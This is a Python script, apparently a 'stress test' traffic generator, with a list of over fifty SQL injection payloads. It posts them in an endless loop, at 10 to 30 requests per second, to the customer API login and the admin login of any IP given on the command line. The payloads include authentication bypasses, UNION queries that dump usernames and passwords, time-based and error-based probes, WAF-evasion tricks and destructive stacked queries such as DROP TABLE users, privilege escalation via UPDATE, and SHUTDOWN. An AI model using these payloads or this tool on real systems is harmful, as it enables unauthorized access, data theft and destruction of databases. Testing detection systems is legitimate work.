import requests
import random
import sys
import time

API_LOGIN = "/api/customers/login/"
ADMIN_LOGIN = "/admin/login/"

HEADERS = {
    "User-Agent": "SQLiTrafficGenerator/StressTest"
}

# ==========================================================
#  SQL INJECTION PAYLOADS — MỞ RỘNG (60+ PAYLOAD)
# ==========================================================
SQLI_PAYLOADS = [
    # Basic bypass
    {"username": "admin", "password": "' OR 1=1 --"},
    {"username": "guest", "password": "' OR ''='' --"},
    {"username": "root", "password": "' OR TRUE --"},
    {"username": "user", "password": "' OR 'x'='x' --"},
    {"username": "john", "password": "\" OR \"1\"=\"1"},
    {"username": "test", "password": "') OR ('1'='1"},
    {"username": "login", "password": "' OR NOT 'a'='b' --"},

    # Union-based injections
    {"username": "u1", "password": "' UNION SELECT 1,2,3 --"},
    {"username": "u2", "password": "' UNION SELECT NULL,NULL,NULL --"},
    {"username": "u3", "password": "' UNION SELECT username,password,1 FROM users --"},
    {"username": "u4", "password": "abc' UNION SELECT @@version,2,3 --"},
    {"username": "u5", "password": "' UNION SELECT database(), user(), version() --"},

    # Error-based injections
    {"username": "e1", "password": "' AND updatexml(1,concat(0x7e,(SELECT user()),0x7e),1) --"},
    {"username": "e2", "password": "' AND extractvalue(1,concat(0x7e,(SELECT database()),0x7e)) --"},
    {"username": "e3", "password": "' AND 1=(SELECT COUNT(*) FROM information_schema.tables) --"},
    {"username": "e4", "password": "' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT((SELECT version()), FLOOR(RAND()*2)) x FROM information_schema.tables GROUP BY x) t) --"},
    {"username": "e5", "password": "' AND (SELECT SLEEP(0)) --"},

    # Blind-based boolean
    {"username": "b1", "password": "' AND 1=1 --"},
    {"username": "b2", "password": "' AND 1=2 --"},
    {"username": "b3", "password": "' AND 5>3 --"},
    {"username": "b4", "password": "' AND 'a'='a' --"},
    {"username": "b5", "password": "' AND (SELECT 'valid')='valid' --"},

    # Time-based blind
    {"username": "tb1", "password": "' OR IF(1=1, SLEEP(2), 0) --"},
    {"username": "tb2", "password": "' AND IF((SELECT COUNT(*) FROM users)>1, SLEEP(1), 0) --"},
    {"username": "tb3", "password": "'; SELECT SLEEP(2); --"},
    {"username": "tb4", "password": "' WAITFOR DELAY '0:0:2' --"},
    {"username": "tb5", "password": "\" OR SLEEP(1) #\""},

    # Stacked queries
    {"username": "sq1", "password": "abc'; DROP TABLE users; --"},
    {"username": "sq2", "password": "'; UPDATE users SET admin=1 WHERE username='guest'; --"},
    {"username": "sq3", "password": "'; INSERT INTO logs(msg) VALUES('hacked'); --"},
    {"username": "sq4", "password": "'; COMMIT; --"},
    {"username": "sq5", "password": "'; SHUTDOWN; --"},

    # Comment-based variations
    {"username": "c1", "password": "' OR 1=1#"},
    {"username": "c2", "password": "' OR 1=1/*"},
    {"username": "c3", "password": "admin'/*"},
    {"username": "c4", "password": "'/**/OR/**/1/**/=/**/1 --"},
    {"username": "c5", "password": "' OR/**/TRUE/**/--"},

    # WAF bypass styles
    {"username": "w1", "password": "')||(1=1)--"},
    {"username": "w2", "password": "') OR ('x' LIKE 'x"},
    {"username": "w3", "password": "' OR 1 LIKE 1 --"},
    {"username": "w4", "password": "admin')/*comment*/OR/*test*/('1'='1"},
    {"username": "w5", "password": "' OR '1' IN ('1','2','3') --"},

    # Hex / Encoding tricks
    {"username": "hx1", "password": "' OR 0x31=0x31 --"},
    {"username": "hx2", "password": "%27%20OR%201=1%20--"},
    {"username": "hx3", "password": "admin' OR 1=1 %23"},
    {"username": "hx4", "password": "' UNION SELECT 0x61646D696E,2,3 --"},
    {"username": "hx5", "password": "' OR UNHEX('31')='1' --"},

    # Random creative payloads
    {"username": "r1", "password": "' OR EXISTS(SELECT * FROM users) --"},
    {"username": "r2", "password": "' OR JSON_EXTRACT('{\"a\":1}', '$.a')=1 --"},
    {"username": "r3", "password": "' OR (SELECT LENGTH('abc'))=3 --"},
    {"username": "r4", "password": "' OR (SELECT COUNT(*) FROM mysql.user)>0 --"},
    {"username": "r5", "password": "' OR (SELECT UPPER('test'))='TEST' --"},
]

# ==========================================================
#  TRAFFIC GENERATOR
# ==========================================================
def generate_sqli_traffic(base_url):
    api_url = base_url + API_LOGIN
    admin_url = base_url + ADMIN_LOGIN

    session = requests.Session()

    print("\n=== SQLi Traffic Generator Started ===")
    print(f"Base URL: {base_url}")
    print("Requests per second: RANDOM 10 → 30")
    print("Nhấn CTRL + C để dừng.\n")

    total_sent = 0

    try:
        while True:
            # Random từ 10 đến 30 req/s
            rps = random.randint(10, 30)
            interval = 1 / rps

            # Mỗi vòng gửi đúng một request đến 2 endpoint
            payload = random.choice(SQLI_PAYLOADS)

            try:
                session.post(api_url, data=payload, headers=HEADERS, timeout=1)
                session.post(admin_url, data=payload, headers=HEADERS, timeout=1)
            except:
                pass

            total_sent += 2

            if total_sent % 20 == 0:
                print(f"[INFO] Sent {total_sent} SQLi-test requests (rps={rps})")

            time.sleep(interval)

    except KeyboardInterrupt:
        print(f"\n=== STOPPED ===")
        print(f"Tổng request gửi: {total_sent}\n")


def main():
    if len(sys.argv) < 2:
        print("Usage: python sqli_traffic.py <IP>")
        sys.exit(1)

    ip = sys.argv[1]
    base_url = f"http://{ip}"

    generate_sqli_traffic(base_url)


if __name__ == "__main__":
    main()
